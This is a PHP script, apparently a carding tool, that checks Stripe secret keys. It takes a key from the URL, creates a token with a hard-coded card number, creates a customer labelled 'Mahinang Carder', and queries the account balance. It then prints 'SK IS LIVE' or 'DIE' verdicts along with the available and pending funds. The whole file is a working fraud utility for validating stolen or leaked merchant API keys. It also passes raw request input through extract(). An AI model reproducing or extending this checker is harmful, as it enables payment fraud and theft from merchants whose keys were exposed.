<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

$start_time = microtime(true);
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function RandomString($length = 23) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}

$sec = $_GET['lista'];

extract($_GET);
$lista = str_replace(" " , "", $lista);
$i = explode("|", $lista);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");
$name = RandomString();
$lastname = RandomString();

$pub = 'pk_live_';
///=========//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $d = curl_exec($ch);
$s = json_decode($d, true);
$sk3 = trim(strip_tags(getStr($d, '"code": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "description=Mahinang Carder&source=".$s["id"]);
curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
$e = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
$result = curl_exec ($ch);
curl_close ($ch);

$b = json_decode($result,true);
$ab = '';
$pb = '';
$ac = '';
$pc = '';

if(isset($b['available'][0]['amount'])){
  $ab = number_format($b['available'][0]['amount'], 2, '.' ,' , ');
  $ac = $b['available'][0]['currency'];
} 

if (isset($b['pending'][0]['amount'])) {
  $pb = number_format($b['pending'][0]['amount'], 2, '.' ,' , ');
  $pc = $b['pending'][0]['currency'];
}

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$cus = json_decode(curl_exec($ch), true);
$sk1 = trim(strip_tags(getStr($e,'"code": "','"')));
$sk2 = trim(strip_tags(getStr($e,'"message": "','"')));
$sk4 = trim(strip_tags(getStr($e,'"decline_code": "','"')));
$cvv = trim(strip_tags(getStr($e,'"cvc_check": "','"')));
$end_time = microtime(true);
   $execution_time = $end_time - $start_time;
   $execution_time = number_format($execution_time, 2);

if ((strpos($e, 'Your card was declined.')) ||(strpos($d, 'Your card was declined.'))) {
    echo '<b><span class="text-success">#CHARGED - [SK IS LIVE]</b></span><span class="text-success"> <b><i> '.$lista.'<br></span>
𝘽𝙖𝙡𝙖𝙣𝙘𝙚:  '.$ab.'<br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: '.$ac.' <br>
𝙋𝙚𝙣𝙙𝙞𝙣𝙜: '.$pb.' <br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮:  '.$pc.'<br>
  Time Taken: '.$execution_time.'<br>
  ';
} 
elseif (strpos($e, 'rate_limit')) {
    echo '<b><span class="text-warning">#LIVE - [rate_limit]</b></span><span class="text-warning"> <b><i> '.$lista.' </span><br>𝘽𝙖𝙡𝙖𝙣𝙘𝙚:  '.$ab.'<br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: '.$ac.' <br>
𝙋𝙚𝙣𝙙𝙞𝙣𝙜: '.$pb.' <br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮:  '.$pc.'<br>
  Time Taken: '.$execution_time.'<br>';
} 
elseif (strpos($e, 'api_key_expired')) {
    echo '<b><span class="text-danger">#DIE - [api_key_expired]</b></span><span class="text-danger"> <b><i> '.$lista.' </span>  <br></br>';
} 
elseif (strpos($e, 'Invalid API Key provided')) {
	echo '<b><span class="text-danger">#DIE - [Invalid API Key provided]</b></span><span class="text-danger"> <b><i> '.$lista.' </span>  <br></br>';
} 
elseif (strpos($d, 'testmode_charges_only')) {
	echo '<b><span class="text-danger">#DIE - [testmode_charges_only] </b></span><span class="text-danger"> <b><i>'.$lista.' </span>  <br>𝘽𝙖𝙡𝙖𝙣𝙘𝙚:  '.$ab.'<br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: '.$ac.' <br>
𝙋𝙚𝙣𝙙𝙞𝙣𝙜: '.$pb.' <br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮:  '.$pc.'<br>
  Time Taken: '.$execution_time.'<br>';
} 
elseif (strpos($e, 'test_mode_live_card')) {
	echo '<b><span class="text-danger">#DIE [test_mode_live_card] </b></span><span class="text-danger"> <b><i>'.$lista.' </span><br>  𝘽𝙖𝙡𝙖𝙣𝙘𝙚:  '.$ab.'<br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: '.$ac.' <br>
𝙋𝙚𝙣𝙙𝙞𝙣𝙜: '.$pb.' <br> 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮:  '.$pc.'<br>
  Time Taken: '.$execution_time.'<br>';
} 
else {
    echo '<b><span class="text-danger"> #DIE - [SK IS DIE]  </b></span> <span class="text-danger"><b><i> '.$lista.'</span><br></br>';
}

?>

